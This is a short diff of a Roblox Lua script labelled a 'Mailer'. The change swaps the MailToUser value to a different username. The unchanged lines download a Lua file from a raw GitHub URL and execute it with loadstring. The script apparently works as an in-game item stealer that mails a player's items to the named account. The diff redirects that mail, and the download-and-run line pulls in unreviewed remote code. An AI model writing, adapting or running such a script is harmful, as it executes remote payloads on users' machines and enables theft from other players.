@@ -1,6 +1,6 @@
 -- Mailer with True and False Checker
 
-getgenv().MailToUser = "ADHDMeth"
+getgenv().MailToUser = "ProfiAzUr"
 
 local proceed = loadstring("return " .. game:HttpGet("https://raw.githubusercontent.com/TheArexH4CKER/check/refs/heads/main/check.lua"))()
 
